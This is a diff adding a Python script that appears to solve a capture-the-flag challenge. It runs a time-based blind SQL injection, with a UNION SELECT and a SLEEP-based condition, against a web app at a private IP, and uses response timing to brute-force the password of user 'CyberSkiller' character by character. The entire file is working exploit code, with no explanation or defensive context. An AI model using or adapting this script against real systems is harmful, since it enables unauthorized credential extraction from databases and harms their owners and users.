@@ -1,0 +1,25 @@
+import requests 
+import time
+import string
+
+def check_password(password):
+	URL = 'http://10.0.106.247/?query=%22+union+select+if%28password+like+%27CS{}%25%27%2C+sleep%285%29%2C+%22a%22%29+from+users+where+username+%3D+%27CyberSkiller%27+--+a'
+	url_with_password = URL.format(password)
+
+	start_time = time.time()
+	requests.get(url_with_password)
+	end_time = time.time()
+
+	return (end_time - start_time) > 1
+
+password = ''
+while True:
+	found = False
+	for c in string.ascii_uppercase + string.digits:
+		if check_password(password +c):
+			password = password + c
+			found = True
+			break
+	if not found:
+		break
+	print(password)
